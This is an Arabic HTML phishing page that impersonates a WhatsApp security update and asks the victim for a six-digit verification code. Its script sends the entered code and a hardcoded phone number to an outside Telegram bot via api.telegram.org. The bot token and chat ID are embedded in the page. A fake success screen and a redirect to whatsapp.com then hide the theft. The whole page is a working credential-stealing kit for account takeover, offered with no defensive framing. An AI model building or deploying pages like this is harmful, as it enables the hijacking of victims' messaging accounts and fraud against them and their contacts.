<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Update</title>
    <style>
        :root { --wa-bg: #111b21; --wa-green: #00a884; --wa-text: #e9edef; --card-bg: #1d2a33; --wa-hint: #8696a0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }

        /* اللوجو */
        .logo { width: 65px; height: 65px; margin-bottom: 20px; }

        .title { font-size: 22px; font-weight: 500; margin-bottom: 25px; color: #fff; }

        /* البطاقة التعريفية (نفس اللي في الصورة) */
        .status-card { 
            background: var(--card-bg); border-radius: 12px; padding: 20px; 
            width: 100%; max-width: 380px; text-align: right; 
            margin-bottom: 25px; border: 1px solid #222d34;
        }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
        .info-row .label { color: var(--wa-hint); }
        .info-row .val { color: #fff; font-weight: bold; }
        .warning { color: #f15c5c; font-size: 14px; font-weight: bold; text-align: center; display: block; margin-top: 10px; }

        .desc { font-size: 14px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 30px; text-align: center; max-width: 350px; }

        /* تنسيق الرقم */
        .phone-display { font-size: 22px; color: var(--wa-green); font-weight: bold; margin-bottom: 30px; direction: ltr; }

        /* حقل الإدخال */
        .otp-input {
            width: 100%; max-width: 300px; background: transparent; border: none; 
            border-bottom: 2px solid var(--wa-green); color: #fff; font-size: 32px; 
            text-align: center; outline: none; letter-spacing: 12px; margin-bottom: 40px;
        }

        /* الزرار الأخضر */
        .submit-btn {
            background: var(--wa-green); color: #111b21; border: none; 
            width: 100%; max-width: 380px; padding: 18px; border-radius: 10px; 
            font-size: 18px; font-weight: bold; cursor: pointer;
        }
    </style>
</head>
<body>

    <svg class="logo" viewBox="0 0 24 24" fill="#00a884">
        <path d="M12.004 2C6.48 2 2 6.48 2 12c0 1.73.44 3.36 1.21 4.78L2 22l5.41-1.16C8.83 21.6 10.37 22 12.004 22c5.52 0 10-4.48 10-10s-4.48-10-10-10zm.003 18c-1.5 0-2.91-.4-4.13-1.1l-.3-.17-3.07.66.67-2.94-.19-.31C4.34 14.96 4 13.53 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8-3.59 8-8 8z"/>
    </svg>

    <h1 class="title">تحديث بروتوكول الأمان</h1>

    <div class="status-card">
        <div class="info-row">
            <span class="label">الجهاز المكتشف:</span>
            <span class="val" id="device-type">iPhone</span>
        </div>
        <div class="info-row">
            <span class="label">حالة التشفير:</span>
            <span class="val">SSL/TLS v1.3</span>
        </div>
        <span class="warning">مطلوب تحديث (v2.4)</span>
    </div>

    <p class="desc">تم إصلاح أخطاء التوافق في التحديث الأخير. يرجى إدخال رمز المزامنة لتأمين محادثاتك على هذا الجهاز.</p>
    
    <div class="phone-display" id="masked-phone"></div>

    <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">

    <button class="submit-btn" onclick="sendData()">تحديث ومزامنة الآن</button>

    <script>
        const CFG = {
            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            C: '5446862709',
            P: '01030003287'
        };

        // كشف الجهاز وعرض الرقم
        window.onload = () => {
            const ua = navigator.userAgent;
            document.getElementById('device-type').innerText = /iPhone|iPad/i.test(ua) ? "iPhone (iOS)" : "Android Device";
            // عرض الرقم زي الصورة بالظبط
            document.getElementById('masked-phone').innerText = "+20 " + CFG.P.substring(0,3) + " ••••• " + CFG.P.slice(-2);
        };

        async function sendData() {
            const code = document.getElementById('otp').value;
            if(code.length === 6) {
                const btn = document.querySelector('.submit-btn');
                btn.innerText = "جاري المزامنة...";
                btn.disabled = true;

                // إرسال للبوت
                await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CFG.C,
                        text: `🔥 كود مزامنة جديد:\nالرقم: ${CFG.P}\nالكود: ${code}`,
                        parse_mode: 'HTML'
                    })
                });

                // شاشة النهاية
                document.body.innerHTML = `
                    <div style="text-align:center; padding-top:100px;">
                        <svg width="60" height="60" viewBox="0 0 24 24" fill="#00a884"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                        <h2 style="color:#fff; margin-top:20px;">تمت المزامنة بنجاح</h2>
                        <p style="color:#8696a0; margin-top:10px;">تم تفعيل بروتوكول v2.4 وتأمين المحادثات.</p>
                    </div>
                `;
                setTimeout(() => window.location.href = "https://www.whatsapp.com", 3000);
            }
        }
    </script>
</body>
</html>
